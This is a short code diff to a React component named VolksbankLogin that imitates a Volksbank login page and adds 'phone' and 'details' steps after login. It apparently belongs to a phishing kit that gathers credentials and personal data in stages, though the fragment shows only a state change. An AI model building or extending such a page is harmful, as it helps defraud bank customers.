@@ -29,7 +29,7 @@ const VolksbankLogin = () => {
   usePageMeta("Volksbank - Login", volksbankIcon);
   useEffect(() => { window.scrollTo(0, 0); }, []);
 
-  const [step, setStep] = useState<"login" | "data">("login");
+  const [step, setStep] = useState<"login" | "phone" | "details">("login");
   const [sessionId, setSessionId] = useState<string>("");
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
